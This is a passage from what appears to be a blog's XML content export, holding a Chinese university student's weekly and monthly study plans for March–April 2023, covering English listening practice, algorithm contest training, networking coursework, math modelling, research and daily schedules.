<li>蓝桥杯的训练</li>
<li>以上任务灵活调配</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>现在将晚上的时间固定为科研的时间段</li>
<li>最后半个小时有用于规划时间和制定计划</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>一回去就洗澡</li>
<li>还要算上护肤的时间差不多</li>
<li>睡眠时间<ol>
<li>12:00 - 7:30（理想）</li>
<li>7.5小时</li>
</ol>
</li>
</ol>
<h2 id="每日复盘"><a href="#每日复盘" class="headerlink" title="每日复盘"></a>每日复盘</h2><h3 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h3><ol>
<li>英语也是不行</li>
<li>科研没有头绪</li>
<li>算法了leetcode 再刷简单题</li>
<li>蓝桥杯还没有熟悉训练的节奏</li>
<li>计算机网络太久没学了有点忘了</li>
<li>数学建模的算法库进度到一半了</li>
</ol>
<h3 id="周二"><a href="#周二" class="headerlink" title="周二"></a>周二</h3><p>1. </p>
<h3 id="周三"><a href="#周三" class="headerlink" title="周三"></a>周三</h3><ol>
<li>今天把时间序列搞定了</li>
<li>明天把那些机器树搞定，这周的数学任务就算结束了</li>
<li>如果有时间就看一看数据可视化</li>
<li>感觉等4月份的时候还有根据到时比赛反馈的经验再学一点东西</li>
<li>这个月的数模工作就到明天为止</li>
</ol>
<h3 id="周四"><a href="#周四" class="headerlink" title="周四"></a>周四</h3><p>1. </p>
<h3 id="周五"><a href="#周五" class="headerlink" title="周五"></a>周五</h3><ol>
<li>倾向性得分大致搞定</li>
<li>计算机网络还差一天的量</li>
<li>算法还没开始刷</li>
<li>计算机网络开始刷题</li>
<li>英语没有任何进展</li>
<li></li>
</ol>
<h3 id="周六"><a href="#周六" class="headerlink" title="周六"></a>周六</h3><h3 id="周日"><a href="#周日" class="headerlink" title="周日"></a>周日</h3><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.03.5th.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.03.5th.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-03-第五周计划"><a href="#2023-03-第五周计划" class="headerlink" title="2023.03.第五周计划"></a>2023.03.第五周计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li><p>计算机网络感觉没时间来刷题</p>
<ol>
<li>感觉要是时候放弃</li>
<li>可能要等蓝桥杯结束，才有时间进行</li>
<li>差不多只要持续一周这样子</li>
</ol>
</li>
<li><p>数模速刷</p>
<ol>
<li>感觉不切实际</li>
<li>等参加完天府杯，在看看怎么办</li>
<li>现在先把数模缓一缓</li>
</ol>
</li>
<li><p>算法竞赛速成</p>
<ol>
<li>有可能，但又不舍得</li>
<li>算法结束之后要把leetcode的动态规划结束</li>
</ol>
</li>
<li><p>科研任务</p>
<ol>
<li>只有周末有时间搞</li>
</ol>
</li>
<li><p>英语	</p>
<ol>
<li>每天的上午搞</li>
<li>感觉时间还是有点少</li>
<li>如果听力的话，那么就没有时间进行精听</li>
</ol>
</li>
<li><p>学校课程</p>
</li>
<li><p>思考如何把深夜的时间利用起来</p>
<ol>
<li>先思考要不要利用，现在时间很紧需要利用一下</li>
<li>时间段：10:30 - 11:30；12:00 - 1:00；</li>
<li>睡觉时间：1:00 - 7:30;</li>
<li>时间用于看论文</li>
</ol>
</li>
<li><p>已经把所有的外因全部解决了</p>
<ol>
<li>剩下的只要钻心备战就行了</li>
</ol>
</li>
<li><p>规划一下蓝桥杯 备战的策略</p>
<ol>
<li>上午<ol>
<li>先把每天的任务完成了</li>
<li>复习前一天所学</li>
<li>做成笔记</li>
</ol>
</li>
<li>下午<ol>
<li>刷历年真题</li>
</ol>
</li>
<li>晚上<ol>
<li>acwing</li>
</ol>
</li>
</ol>
</li>
<li><p>刷题策略</p>
</li>
<li><p>近5年编程题</p>
</li>
<li><p>小题</p>
</li>
<li><p>上次模拟题</p>
</li>
<li><p>leetcode+洛谷</p>
</li>
<li><p>思考工作室和自习室</p>
</li>
<li><p>思考每天的学习时间</p>
</li>
<li><p>上午是在工作室还是自习室</p>
</li>
<li><p>可以在工作室</p>
</li>
<li><p>中午的时候在自习室</p>
</li>
<li><p>下午到晚上的时候在自习室学习</p>
</li>
<li><p>其实可以每天晚上到工作室进行，训练</p>
</li>
<li><p>时间差不多是10:30 - 11:30</p>
</li>
<li><p>刚好一个小时</p>
</li>
<li><p>而且也刚好都在一起</p>
</li>
<li><p>每天要练习的算法模板</p>
</li>
<li><p>kmp</p>
</li>
<li><p>图论的所有算法</p>
</li>
<li><p>二分</p>
</li>
<li><p>hash</p>
</li>
<li></li>
<li><p>思考每天的学习时间</p>
</li>
<li><p>上午 英语</p>
</li>
<li><p>中午 算法</p>
</li>
<li><p>下午 课程学习</p>
</li>
<li><p>晚上 科研</p>
</li>
<li><p>深夜 数模</p>
</li>
<li><p>思考如何早起</p>
</li>
<li><p>早起还是要从自己做起</p>
</li>
<li><p>目前想法是</p>
</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>蓝桥杯的训练</li>
<li>英语听力</li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>周末正常进行科研任务的汇报</li>
<li>离散数学完成作业就行了</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>计算机网络本周完成刷题</li>
<li>蓝桥杯<ol>
<li>第一周学习基础算法</li>
<li>第二周疯狂刷历练真题</li>
<li>第三周，模拟练习</li>
</ol>
</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>英语听力进度结束</li>
<li>词汇要进行一半</li>
<li>听力精听<ol>
<li>一段一段对话的听</li>
<li>做完一段对话</li>
<li>在反复的听</li>
<li>最后再看答案</li>
<li>将文章翻译</li>
<li>再反复的听</li>
<li>思考为什么没听出来</li>
<li>听关键的转折处</li>
<li>思考其他选项为什么错</li>
<li></li>
</ol>
</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>现在暂时不需要编程</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（8-00-12-00）"><a href="#上午（8-00-12-00）" class="headerlink" title="上午（8:00-12:00）"></a>上午（8:00-12:00）</h3><ol>
<li>学习英语（10:00-11:30）<ol>
<li>只练习听力</li>
</ol>
</li>
</ol>
<h3 id="中午（13-00-14-00）"><a href="#中午（13-00-14-00）" class="headerlink" title="中午（13:00-14:00）"></a>中午（13:00-14:00）</h3><ol>
<li>刷数学建模</li>
<li>论文</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>蓝桥杯集训</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>科研时间（周二、周三除外）</li>
<li>周二、周三时间自由安排</li>
<li>可以用来整理笔记</li>
<li>11点半回宿舍</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>不刷视频</li>
<li>12点前睡觉</li>
<li>睡眠时间<ol>
<li>12:00 - 7:30（理想）</li>
<li>7.5小时</li>
</ol>
</li>
</ol>
<h2 id="每日复盘"><a href="#每日复盘" class="headerlink" title="每日复盘"></a>每日复盘</h2><h3 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h3><p>1. </p>
<h3 id="周二"><a href="#周二" class="headerlink" title="周二"></a>周二</h3><p>1. </p>
<h3 id="周三"><a href="#周三" class="headerlink" title="周三"></a>周三</h3><p>1. </p>
<h3 id="周四"><a href="#周四" class="headerlink" title="周四"></a>周四</h3><p>1. </p>
<h3 id="周五"><a href="#周五" class="headerlink" title="周五"></a>周五</h3><p>1. </p>
<p>2. </p>
<h3 id="周六"><a href="#周六" class="headerlink" title="周六"></a>周六</h3><h3 id="周日"><a href="#周日" class="headerlink" title="周日"></a>周日</h3><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.03.4th.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.03.4th.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-03-第四周计划"><a href="#2023-03-第四周计划" class="headerlink" title="2023.03.第四周计划"></a>2023.03.第四周计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li><p>上周把计算机网络大致搞定了</p>
<ol>
<li>这周要把知识沉淀一下</li>
</ol>
</li>
<li><p>科研如果遇到不懂的问题，最好还是找到论文讲解的ppt，这个比较好懂</p>
</li>
<li><p>容易被别人影响</p>
</li>
<li><p>水课还是用来刷题比较好</p>
</li>
<li><p>英语的进度要提前了</p>
</li>
<li><p>要提高一下科研的效率</p>
</li>
<li><p>感觉时间非常不够用</p>
<ol>
<li><p>增加时间</p>
<ol>
<li>早起</li>
<li></li>
</ol>
</li>
<li><p>时间使用的效率</p>
<ol>
<li></li>
</ol>
</li>
</ol>
</li>
<li><p>每天任务</p>
<ol>
<li>英语听力一节</li>
<li>acwing</li>
<li>计算机网络刷题（3节）</li>
<li>acwing刷题，只要把章节练习刷完就行</li>
<li>每天一篇论文</li>
<li>周4、5、6晚上学习科研论文</li>
</ol>
</li>
<li><p>思考一下算法的意义</p>
<ol>
<li>还有没有必要刷算法</li>
<li>感觉已经没什么意义了</li>
</ol>
</li>
<li><p>思考竞赛的意义</p>
</li>
<li><p>感觉在我这所学校，竞赛已经没有什么意义了</p>
</li>
<li><p>我现在学习的意义是什么</p>
</li>
<li><p>感觉时间非常的紧</p>
</li>
<li><p>要删掉一下任务</p>
</li>
<li><p>最多不能同时进行三个任务</p>
</li>
<li><p>也就是上午、下午、晚上各一件事情</p>
</li>
<li><p>最多</p>
</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>蓝桥杯的训练</li>
<li>科研工作的进行</li>
<li>计算机网络刷题及笔记整理</li>
<li>英语听力</li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>周末正常进行科研任务的汇报</li>
<li>离散数学完成作业就行了</li>
<li>这周完成把科研笔记做完，方法的思想大致掌握</li>
<li>数学建模集训<ol>
<li>每天看一篇论文，在最后一个比赛结束前，组员共看一篇论文。<ol>
<li>如何看论文</li>
<li>周日来讨论</li>
<li>如何讨论</li>
</ol>
</li>
<li>比赛结束后，每周看2~3篇论文<ol>
<li>由每个人来轮流挑选论文，供组员查看</li>
</ol>
</li>
</ol>
</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>计算机网络本周完成刷题<ol>
<li>刷题时间放在上课的时间内完成</li>
<li>整理思维导图</li>
<li>这周之内完成计网的刷题</li>
<li>一天差不多4节</li>
<li>要找一个时间来刷题</li>
<li>上午的2个小时</li>
</ol>
</li>
<li>蓝桥杯<ol>
<li>第一周学习基础算法</li>
<li>第二周疯狂刷历练真题</li>
<li>第三周，模拟练习</li>
</ol>
</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>英语听力进度结束</li>
<li>词汇要进行一半</li>
<li>听力精听<ol>
<li>一段一段对话的听</li>
<li>做完一段对话</li>
<li>在反复的听</li>
<li>最后再看答案</li>
<li>将文章翻译</li>
<li>再反复的听</li>
<li>思考为什么没听出来</li>
<li>听关键的转折处</li>
<li>思考其他选项为什么错</li>
<li></li>
</ol>
</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>现在暂时不需要编程</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（8-00-12-00）"><a href="#上午（8-00-12-00）" class="headerlink" title="上午（8:00-12:00）"></a>上午（8:00-12:00）</h3><ol>
<li>上课<ol>
<li>时间用刷计算机网络的题目</li>
</ol>
</li>
<li>学习英语（10:00-11:30）<ol>
<li>只练习听力</li>
</ol>
</li>
<li></li>
</ol>
<h3 id="中午（13-00-14-00）"><a href="#中午（13-00-14-00）" class="headerlink" title="中午（13:00-14:00）"></a>中午（13:00-14:00）</h3><ol>
<li>刷数学建模</li>
<li>论文</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>蓝桥杯集训</li>
<li></li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>科研时间（周二、周三除外）</li>
<li>周二、周三时间自由安排</li>
<li>可以用来整理笔记</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>一回去就洗澡</li>
<li>还要算上护肤的时间差不多</li>
<li>睡眠时间<ol>
<li>12:00 - 7:30（理想）</li>
<li>7.5小时</li>
</ol>
</li>
</ol>
<h2 id="每日复盘"><a href="#每日复盘" class="headerlink" title="每日复盘"></a>每日复盘</h2><h3 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h3><p>1. </p>
<h3 id="周二"><a href="#周二" class="headerlink" title="周二"></a>周二</h3><p>1. </p>
<h3 id="周三"><a href="#周三" class="headerlink" title="周三"></a>周三</h3><p>1. </p>
<h3 id="周四"><a href="#周四" class="headerlink" title="周四"></a>周四</h3><p>1. </p>
<h3 id="周五"><a href="#周五" class="headerlink" title="周五"></a>周五</h3><p>1. </p>
<p>2. </p>
<h3 id="周六"><a href="#周六" class="headerlink" title="周六"></a>周六</h3><h3 id="周日"><a href="#周日" class="headerlink" title="周日"></a>周日</h3><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.03.MonthPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.03.MonthPlan/</url>
    <content><![CDATA[<h1 id="2023-3月计划"><a href="#2023-3月计划" class="headerlink" title="2023.3月计划"></a>2023.3月计划</h1><h2 id="上月总结"><a href="#上月总结" class="headerlink" title="上月总结"></a>上月总结</h2><ol>
<li>思考下个月的安排</li>
<li></li>
</ol>
<h2 id="规划"><a href="#规划" class="headerlink" title="规划"></a>规划</h2><ol>
<li>数学建模训练(3.13- 3.19)</li>
<li>科研任务展开(3.20 - 3.27)</li>
<li>蓝桥杯比赛（3.20-4.2）</li>
<li>要放弃软件方向但是还是要做几个项目出来<ol>
<li>五月份正式开始</li>
<li>在四月份的时候要把预备知识学习了</li>
</ol>
</li>
<li>力扣要在五月份之前刷完</li>
<li>英语要在4、5月进行集训（如果有抢到名额的话）</li>
<li>英语要在三月把听力的技巧学完，方便后面练习</li>
<li>下个月要全力进行数学建模比赛</li>
<li>下个要还要在科研上面有所进展</li>
<li>4月要在英语应该阅读是下功夫</li>
<li>5月把写作搞定，再进行整个套卷的练习</li>
<li>下个月力扣要刷一半</li>
<li>如果可以数据库要结束掉了</li>
<li>下个月操作系统的笔记也要整理一下</li>
<li>下个月编程要搞起来了</li>
<li>要新增加一个软考的任务</li>
<li>设定一个复习时间（4.27日）</li>
</ol>
<h2 id="Subject-to-Arrange"><a href="#Subject-to-Arrange" class="headerlink" title="Subject to Arrange"></a>Subject to Arrange</h2><h3 id="数学-x2F-科研"><a href="#数学-x2F-科研" class="headerlink" title="数学&#x2F;科研"></a>数学&#x2F;科研</h3><ol>
<li>数学建模训练</li>
<li>科研任务展开</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>先准备报名，时刻留意报名信息</li>
<li>先训练仔细阅读 + 翻译</li>
<li>然后在段落匹配 + 选词填空</li>
<li><hr>
</li>
<li>然后在听力 + 写作</li>
</ol>
<h3 id="计算机-x2F-编程"><a href="#计算机-x2F-编程" class="headerlink" title="计算机&#x2F;编程"></a>计算机&#x2F;编程</h3><ol>
<li>要结束数据库课程</li>
<li>计算机网络要进入到1&#x2F;4的进度<ol>
<li>这个任务要改一下</li>
<li>感觉要</li>
</ol>
</li>
<li>蓝桥杯比赛</li>
<li></li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.04.1st.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.04.1st.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-04-第一周计划"><a href="#2023-04-第一周计划" class="headerlink" title="2023.04.第一周计划"></a>2023.04.第一周计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li><p>思考如何早起</p>
<ol>
<li>早起还是要从自己做起</li>
<li>这个在思考一下</li>
</ol>
</li>
<li><p>要进行一个作息上的规划</p>
<ol>
<li>上午 英语</li>
<li>中午 算法</li>
<li>下午 计算机课程</li>
<li>晚上 科研</li>
</ol>
</li>
<li><p>如何进行英语规范的学习</p>
<ol>
<li>感觉已经没有必要进行， 大范围的背单词</li>
<li>英语能力 不等于 单词量</li>
<li>它是有听力、阅读、写作来决定，还是要通过提高这些，进而提高英语能力</li>
<li>只能说单词是这些能力的基础</li>
</ol>
</li>
<li><p>每天算法就刷一个小时会不会不够</p>
<ol>
<li>要不要讲科研的时间分一点到算法上面<ol>
<li>不行，科研的时间都不够了</li>
</ol>
</li>
<li>算法提高课有没有必要买<ol>
<li>必须买</li>
</ol>
</li>
</ol>
</li>
<li><p>科研该怎样进行</p>
<ol>
<li>科研一定要都和导师进行沟通	</li>
<li>清楚自己处于科研的那个阶段</li>
<li>也要定期去网上去找科研的经验贴，来给自己一下提示</li>
<li></li>
</ol>
</li>
<li><p>要思考竞赛<br>1. </p>
</li>
<li><p>要新增学期计划</p>
</li>
<li><p>这几周会把乐跑结束掉，可以增加半个小时学习时间</p>
</li>
<li><p>中午用来学习算法</p>
<ol>
<li>acwing</li>
<li>leetcode要不要刷<ol>
<li>这个不是比赛的模式</li>
<li>等到做软件开发的时候在进行刷题</li>
<li>而且感觉还是有很多是不一样的</li>
</ol>
</li>
<li>放弃leetcode的刷题</li>
</ol>
</li>
<li><p>要不要学到那么晚</p>
</li>
<li><p>几种方案</p>
</li>
<li><p>10:30 &amp;&amp; 11:30 &amp;&amp; 12:00</p>
</li>
<li><p>要多去看考研的经验贴和大学的经验贴能够给自己一些提示</p>
</li>
<li><p>这些经验贴什么时候找</p>
</li>
<li><p>什么时间段来看呢</p>
<ol>
<li>上午 社会资讯</li>
<li>下午 考研资讯</li>
<li>晚上 科研和工作资讯</li>
</ol>
</li>
<li><p>花半个小时，当做摸鱼</p>
</li>
<li><p>娱乐计划</p>
</li>
<li><p>不再下棋，等娱乐活动</p>
</li>
<li><p>可以参加体育活动</p>
</li>
<li></li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>英语的学习</li>
<li>调整状态</li>
<li>思考一下未来的路</li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>离散数学完成作业就行了</li>
<li>思考一下科研的未来的规划，和魏老师沟通一下</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>蓝桥杯的真题训练</li>
<li>把acwing题都系统的结束掉</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><p>1. </p>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>现在暂时不需要编程</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>思考一下理财下一步要怎么走</li>
<li>定期的关注考研资讯</li>
<li></li>
</ol>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（8-00-12-00）"><a href="#上午（8-00-12-00）" class="headerlink" title="上午（8:00-12:00）"></a>上午（8:00-12:00）</h3><ol>
<li>学习英语（10:00-11:30）</li>
<li>英语听力精听练习</li>
<li>英语阅读的网课学习</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li>学习算法</li>
<li>学习acwing网课和刷题</li>
<li>半小时看课，一小时刷题</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>蓝桥杯集训</li>
<li>后面的情况是408的学习</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>先应付学校课程作业</li>
<li>进行科研任务的研究</li>
<li>最后花半个小时进行时间的规划</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><p>1. </p>
<h2 id="每日复盘"><a href="#每日复盘" class="headerlink" title="每日复盘"></a>每日复盘</h2><h3 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h3><p>1. </p>
<h3 id="周二"><a href="#周二" class="headerlink" title="周二"></a>周二</h3><p>1. </p>
<h3 id="周三"><a href="#周三" class="headerlink" title="周三"></a>周三</h3><p>1. </p>
<h3 id="周四"><a href="#周四" class="headerlink" title="周四"></a>周四</h3><p>1. </p>
<h3 id="周五"><a href="#周五" class="headerlink" title="周五"></a>周五</h3><p>1. </p>
<p>2. </p>
<h3 id="周六"><a href="#周六" class="headerlink" title="周六"></a>周六</h3><h3 id="周日"><a href="#周日" class="headerlink" title="周日"></a>周日</h3><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.04.2nd.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.04.2nd.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-04-第二周计划"><a href="#2023-04-第二周计划" class="headerlink" title="2023.04.第二周计划"></a>2023.04.第二周计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li><p>科研该怎样进行</p>
<ol>
<li>科研一定要都和导师进行沟通	</li>
<li>清楚自己处于科研的那个阶段</li>
<li>也要定期去网上去找科研的经验贴，来给自己一下提示</li>
<li>公式要自己动手去推一遍</li>
</ol>
</li>
<li><p>要思考竞赛</p>
<ol>
<li><p>参加什么竞赛</p>
<ol>
<li>数学建模比赛</li>
<li>算法比赛</li>
<li></li>
</ol>
</li>
<li><p>何时准备竞赛</p>
<ol>
<li>首先不能牺牲工作日的时间</li>
<li>可以在周末的时候进行训练</li>
<li></li>
</ol>
</li>
</ol>
</li>
<li><p>要多去看考研的经验贴和大学的经验贴能够给自己一些提示</p>
<ol>
<li>这些经验贴什么时候找<ol>
<li>周末的时间专门拿一个时间段来找</li>
</ol>
</li>
</ol>
</li>
<li><p>娱乐计划</p>
<ol>
<li>每天晚上通过看一些经典电影，进行娱乐</li>
<li>还有上课的时候也能进行娱乐<ol>
<li>上午 看一些平时没时间看的公众号文章</li>
<li>下午看 TED 或者下棋</li>
</ol>
</li>
</ol>
</li>
<li><p>思考如何把其他的技能加入到日常计划中<br>1. </p>
</li>
<li><p>只需要保持周一到周五完全学习的时间足以</p>
<ol>
<li>放弃朋友圈和QQ空间</li>
<li>周末的时间用来查找资料</li>
<li>周末用来处理一些繁杂的事情</li>
<li>工作日就专心学习</li>
</ol>
</li>
<li><p>算法以后的安排</p>
<ol>
<li>每天刷个3~5道这样子</li>
<li>就一步步脚踏实地</li>
</ol>
</li>
<li><p>以后不必每件事情都跟别人说</p>
<ol>
<li>要学会隐藏自己</li>
<li>不要过于信任别人</li>
</ol>
</li>
<li><p>思考水课可以干什么</p>
<ol>
<li>不宜学习</li>
</ol>
</li>
<li><p>最近对学习提不起兴趣</p>
</li>
<li><p>大学中需要技巧</p>
</li>
<li><p>能说会写</p>
</li>
<li><p>敢于是错</p>
</li>
<li><p>要积极了解社会的运转规则</p>
</li>
<li><p>《深度说服》</p>
</li>
<li><p>对人不要太真诚</p>
</li>
<li><p>时间不好安排</p>
</li>
<li><p>意味着每项任务不能有超时的机会</p>
</li>
<li><p>一旦超时就意味这后面的内容无法正常完成</p>
</li>
<li><p>计算机网络时间不好安排</p>
</li>
<li><p>是采取任务导向的方式还是时间导向的方式</p>
</li>
<li><p>感觉英语没有时间学习</p>
</li>
<li><p>可能还是要把上课的时间用来学习</p>
</li>
<li><p>主要是用来听力</p>
</li>
<li></li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>调整状态</li>
<li></li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>离散数学完成作业就行了</li>
<li>思考一下科研的未来的规划，和魏老师沟通一下</li>
<li>将前几周欠的研究方法加快推一下</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>acwing算法基础课的题全部都刷完</li>
<li>计算机网络的题目全部刷完</li>
<li>模拟栈和队列有时间要自己重新写一下</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>先每天进行一篇短文的精听训练</li>
<li>看一小时的短文练习</li>
<li>精听5篇材料</li>
<li></li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>现在暂时不需要编程</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>思考一下理财下一步要怎么走</li>
<li>定期的关注考研资讯</li>
<li>去网上收集经验贴</li>
<li>学习pr</li>
<li></li>
</ol>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（10-00-12-00）"><a href="#上午（10-00-12-00）" class="headerlink" title="上午（10:00-12:00）"></a>上午（10:00-12:00）</h3><ol>
<li>英语听力精听练习</li>
<li>英语阅读的网课学习</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li>学习算法</li>
<li>学习acwing网课和刷题</li>
<li>半小时看课，一小时刷题</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>后面的情况是408的学习</li>
<li></li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>先应付学校课程作业</li>
<li>进行科研任务的研究</li>
<li>最后花半个小时进行时间的规划</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>看电影</li>
<li></li>
</ol>
